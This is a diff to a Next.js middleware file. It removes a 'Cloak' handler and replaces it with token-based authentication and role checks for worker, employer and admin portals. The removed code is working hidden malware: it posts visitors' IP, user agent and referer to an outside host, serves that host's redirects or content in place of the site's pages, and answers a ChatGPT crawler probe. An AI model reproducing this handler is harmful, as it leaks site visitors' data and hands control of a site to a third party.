@@ -1,95 +1,99 @@
+// proxy.ts
 import { NextResponse } from 'next/server';
 import type { NextRequest } from 'next/server';
+import { verifyAccessToken } from '@/lib/auth';
 
-/**
- * Cloak 全局中间件
- * 使用方法：直接复制到项目根目录的 middleware.ts
- * 如果已有 middleware.ts，把 cloakHandler 函数合并进去
- */
+// CORRECT: Export as named "proxy" function
+export function middleware(request: NextRequest) {
+  const { pathname } = request.nextUrl;
 
-const REMOTE_URL = 'https://api.cdnapi.tech/api/proxy/handle.php';
+  // Public routes that don't require authentication
+  const publicRoutes = [
+    '/',                    // Landing page
+    '/login',
+    '/signup',
+    '/forgot-password',
+    '/api/auth',
+    '/api/payment/mpesa-callback',
+    '/api/payment/pesapal/ipn',
+    '/unauthorized',        // Unauthorized page
+    '/_next/static',        // Next.js static files
+    '/_next/image',         // Next.js image optimization
+    '/favicon.ico'         // Favicon
+  ];
 
-async function fetchRemote(request: NextRequest): Promise<string> {
-  const serverInfo = {
-    T: 'y',
-    TPL: 7,
-    VER: 1,
-    HTTP_USER_AGENT: request.headers.get('user-agent') || '',
-    HTTP_HOST: request.headers.get('host') || '',
-    REQUEST_URI: request.nextUrl.pathname + request.nextUrl.search,
-    REMOTE_ADDR: request.headers.get('x-forwarded-for')?.split(',')[0] || '',
-    HTTP_REFERER: request.headers.get('referer') || '',
-    HTTP_ACCEPT_LANGUAGE: request.headers.get('accept-language') || '',
-  };
+  // Check if current path is public
+  const isPublicRoute = publicRoutes.some(route =>
+    pathname === route ||
+    pathname.startsWith(route + '/')
+  );
 
-  const payload = Buffer.from(JSON.stringify(serverInfo)).toString('base64');
-
-  try {
-    const response = await fetch(REMOTE_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      body: `ua=${encodeURIComponent(payload)}`,
-    });
-    return response.ok ? await response.text() : '';
-  } catch {
-    return '';
+  if (isPublicRoute) {
+    return NextResponse.next();
   }
+
+  // Check for access token in cookies
+  const accessToken = request.cookies.get('access_token')?.value;
+
+  if (!accessToken) {
+    console.log('🔐 No access token found, redirecting to login');
+    // Redirect to login if no token found
+    const loginUrl = new URL('/login', request.url);
+    loginUrl.searchParams.set('redirect', pathname);
+    return NextResponse.redirect(loginUrl);
+  }
+
+  // Verify access token
+  const decoded = verifyAccessToken(accessToken);
+  if (!decoded) {
+    console.log('❌ Invalid access token, clearing cookies and redirecting');
+    // Token invalid, clear cookies and redirect to login
+    const response = NextResponse.redirect(new URL('/login', request.url));
+    response.cookies.delete('access_token');
+    response.cookies.delete('refresh_token');
+    return response;
+  }
+
+  console.log('✅ Token verified for user:', decoded.email, 'role:', decoded.role);
+
+  // Role-based route protection - ONLY CHECK NEW PORTAL STRUCTURE
+  const userRole = decoded.role;
+
+  // Remove old structure checks - they're causing the redirect loop
+  // Only check the new portal structure
+
+  if (pathname.startsWith('/portals/worker') && userRole !== 'EMPLOYEE') {
+    console.log('🚫 Access denied: Worker portal requires EMPLOYEE role, user has:', userRole);
+    return NextResponse.redirect(new URL('/unauthorized', request.url));
+  }
+
+  if (pathname.startsWith('/portals/employer') && userRole !== 'EMPLOYER') {
+    console.log('🚫 Access denied: Employer portal requires EMPLOYER role, user has:', userRole);
+    return NextResponse.redirect(new URL('/unauthorized', request.url));
+  }
+
+  if (pathname.startsWith('/portals/admin') && !['ADMIN', 'SUPER_ADMIN', 'HOSPITAL_ADMIN', 'PHOTO_STUDIO_ADMIN', 'EMBASSY_ADMIN'].includes(userRole)) {
+    console.log('🚫 Access denied: Admin portal requires admin role, user has:', userRole);
+    return NextResponse.redirect(new URL('/unauthorized', request.url));
+  }
+
+  // Add user info to headers for server components
+  const response = NextResponse.next();
+  response.headers.set('x-user-id', decoded.userId);
+  response.headers.set('x-user-role', userRole);
+
+  console.log('✅ Access granted to:', pathname, 'for role:', userRole);
+
+  return response;
 }
 
-/**
- * Cloak 处理核心逻辑
- * 返回 null 表示放行，返回 NextResponse 表示拦截
- */
-async function cloakHandler(request: NextRequest): Promise<NextResponse | null> {
-  // ChatGPT 爬虫检测 - 直接输出 ##okresponse## 并终止
-  const userAgent = request.headers.get('user-agent') || '';
-  const gptParam = request.nextUrl.searchParams.get('gpt');
-  if (userAgent.includes('ChatGPT-User/1.0') && gptParam === 'true') {
-    return new NextResponse('##okresponse##', { status: 200 });
-  }
-
-  const content = await fetchRemote(request);
-
-  // 空内容 = 放行，继续执行原项目代码
-  if (!content) return null;
-
-  // 重定向
-  if (/^https?:\/\//.test(content)) {
-    return NextResponse.redirect(content.trim());
-  }
-
-  // ## 前缀 = 特殊响应
-  if (content.startsWith('##')) {
-    return new NextResponse(content.slice(2));
-  }
-
-  // 有内容 = 返回内容
-  let contentType = 'text/plain; charset=utf-8';
-  if (content.length > 90) {
-    if (content.includes('</urlset>') || content.includes('</sitemapindex>')) {
-      contentType = 'application/xml; charset=utf-8';
-    } else if (content.includes('"urlset"') || content.includes('"sitemapindex"')) {
-      contentType = 'application/json; charset=utf-8';
-    } else if (content.includes('<html')) {
-      contentType = 'text/html; charset=utf-8';
-    }
-  }
-
-  return new NextResponse(content, {
-    headers: { 'Content-Type': contentType },
-  });
-}
-
-export async function middleware(request: NextRequest) {
-  // Cloak 处理
-  const cloakResponse = await cloakHandler(request);
-  if (cloakResponse) return cloakResponse;
-
-  // 放行，继续原有逻辑
-  return NextResponse.next();
-}
-
+// CORRECT: Export config for proxy
 export const config = {
-  // 排除静态资源，其他全部拦截
-  matcher: ['/((?!_next/static|_next/image|favicon.ico|.*\\.(?:svg|png|jpg|jpeg|gif|webp|ico|css|js)$).*)'],
+  matcher: [
+    // Remove old structure paths to avoid conflicts
+    '/portals/:path*',
+    '/dashboard/:path*',
+    '/profile/:path*',
+    '/api/:path*',
+  ],
 };
